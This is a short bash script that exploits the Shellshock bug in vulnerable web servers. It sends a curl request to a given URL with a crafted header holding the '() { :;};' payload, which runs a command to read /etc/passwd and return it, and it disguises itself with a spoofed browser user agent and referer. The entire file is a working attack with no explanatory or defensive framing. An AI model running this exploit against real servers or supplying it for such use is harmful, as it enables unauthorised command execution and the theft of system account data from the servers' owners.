#!/bin/bash
url="$1"
host="`echo $url|awk -F '/' '{print $1"/"$2"/"$3"/"}'`"
curl -H 'x: () { :;};a=`/bin/cat /etc/passwd`;echo $a' "$url" -I -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36" -e "$host"
